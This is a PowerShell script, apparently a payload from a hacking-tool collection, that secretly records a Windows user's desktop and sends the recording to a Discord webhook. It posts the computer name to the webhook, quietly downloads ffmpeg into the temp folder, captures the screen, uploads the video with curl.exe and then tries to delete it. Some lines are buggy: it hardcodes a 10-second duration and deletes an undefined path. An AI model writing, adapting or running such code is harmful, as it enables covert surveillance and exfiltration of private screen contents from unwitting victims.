<#==================== RECORD SCREEN TO DISCORD =========================

SYNOPSIS
This script records the screen for a specified time to a mkv file,
then sends the file to a discord webhook.
(use -t to specify time limit eg. RecordScreen -t 30)
records 10 seconds by default

USAGE
1. Replace YOUR_WEBHOOK_HERE with your discord webhook.
2. Run script

#>

$hookurl = "$dc" # can be shortened
if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}

Function RecordScreen{
param ([int[]]$t)

$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

$Path = "$env:Temp\ffmpeg.exe"

If (!(Test-Path $Path)){  
$zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
$tempDir = "$env:temp"
$zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
$extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
Remove-Item -Path $zipFilePath -Force
Remove-Item -Path $extractedDir -Recurse -Force
}

sleep 1
$mkvPath = "$env:Temp\ScreenClip.mkv"

if ($t.Length -eq 0){$t = 10}

.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath

curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
sleep 1
rm -Path $mp3Path -Force

}

RecordScreen -t 30
